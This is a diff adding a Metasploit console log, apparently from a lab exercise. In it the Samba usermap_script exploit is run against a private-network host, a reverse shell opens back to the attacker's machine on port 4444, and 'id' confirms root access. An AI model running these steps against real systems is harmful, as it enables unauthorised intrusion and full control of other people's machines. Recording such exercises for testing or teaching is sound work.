@@ -1,0 +1,41 @@
+msf5 auxiliary(scanner/smb/smb_version) > use exploit/multi/samba/usermap_script 
+msf5 exploit(multi/samba/usermap_script) > 
+msf5 exploit(multi/samba/usermap_script) > 
+msf5 exploit(multi/samba/usermap_script) > 
+msf5 exploit(multi/samba/usermap_script) > show options 
+
+Module options (exploit/multi/samba/usermap_script):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT   139              yes       The target port (TCP)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf5 exploit(multi/samba/usermap_script) > set rhosts 192.168.1.31
+rhosts => 192.168.1.31
+msf5 exploit(multi/samba/usermap_script) > run
+
+[*] Started reverse TCP double handler on 192.168.1.14:4444 
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo h7garZdEBnT6rpzz;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "h7garZdEBnT6rpzz\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 1 opened (192.168.1.14:4444 -> 192.168.1.31:42079) at 2020-05-10 23:07:25 +0200
+
+id
+uid=0(root) gid=0(root)
+
